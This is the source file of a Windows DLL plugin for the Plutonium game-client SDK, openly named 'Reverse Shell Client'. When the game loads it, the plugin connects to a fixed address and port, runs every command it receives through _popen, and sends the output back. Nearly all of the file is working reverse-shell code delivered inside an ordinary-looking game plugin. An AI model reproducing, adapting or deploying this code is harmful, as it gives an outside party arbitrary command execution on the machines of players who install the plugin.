// dllmain.cpp : Defines the entry point for the DLL application.
#include "pch.h"
#include "plutonium-sdk/plutonium_sdk.hpp"
#include <iostream>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <string>
#include <memory>
#include <thread>
#include <vector>
#include <sstream>
#include <array>
#include <cstdio> 

#pragma comment(lib, "Ws2_32.lib")

std::unique_ptr<plutonium::sdk::plugin> plugin_;
SOCKET sock;

class plugin_impl : public plutonium::sdk::plugin {
public:
    const char* plugin_name() override {
        return "Reverse Shell Client";
    }

    void on_startup(plutonium::sdk::iinterface* interface_ptr, plutonium::sdk::game game) override {
        interface_ptr->logging()->info("Reverse shell initialized.");
        init_socket();
        std::thread(&plugin_impl::listen_for_commands).detach();
    }

    void on_shutdown() override {
        closesocket(sock);
        WSACleanup();
        std::cout << "[Socket closed]" << std::endl;
    }

    static bool init_socket() {
        WSADATA wsaData;
        if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
            std::cerr << "WSAStartup failed: " << WSAGetLastError() << std::endl;
            return false;
        }

        sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (sock == INVALID_SOCKET) {
            std::cerr << "Socket creation failed: " << WSAGetLastError() << std::endl;
            WSACleanup();
            return false;
        }

        sockaddr_in server;
        server.sin_family = AF_INET;
        server.sin_port = htons(5000);
        inet_pton(AF_INET, "127.0.0.1", &server.sin_addr);

        if (connect(sock, (sockaddr*)&server, sizeof(server)) == SOCKET_ERROR) {
            std::cerr << "Connection to server failed: " << WSAGetLastError() << std::endl;
            closesocket(sock);
            WSACleanup();
            return false;
        }

        return true;
    }

    static void listen_for_commands() {
        char buffer[1024];
        while (true) {
            int bytes_received = recv(sock, buffer, sizeof(buffer) - 1, 0);
            if (bytes_received <= 0) {
                std::cerr << "Connection closed or error: " << WSAGetLastError() << std::endl;
                break;
            }

            buffer[bytes_received] = '\0';
            std::string command(buffer);

            std::string output = execute_command(command);
            send(sock, output.c_str(), output.size(), 0);
        }
    }

    static std::string execute_command(const std::string& command) {
        std::array<char, 128> buffer;
        std::string result;

        FILE* pipe = _popen(command.c_str(), "r");
        if (!pipe) {
            result = "Error opening pipe.";
            return result;
        }

        while (fgets(buffer.data(), buffer.size(), pipe) != nullptr) {
            result += buffer.data();
        }
        _pclose(pipe);
        return result;
    }
};

PLUTONIUM_API plutonium::sdk::plugin* on_initialize() {
    return (plugin_ = std::make_unique<plugin_impl>()).get();
}

BOOL APIENTRY DllMain(HMODULE, DWORD, LPVOID) {
    return TRUE;
}
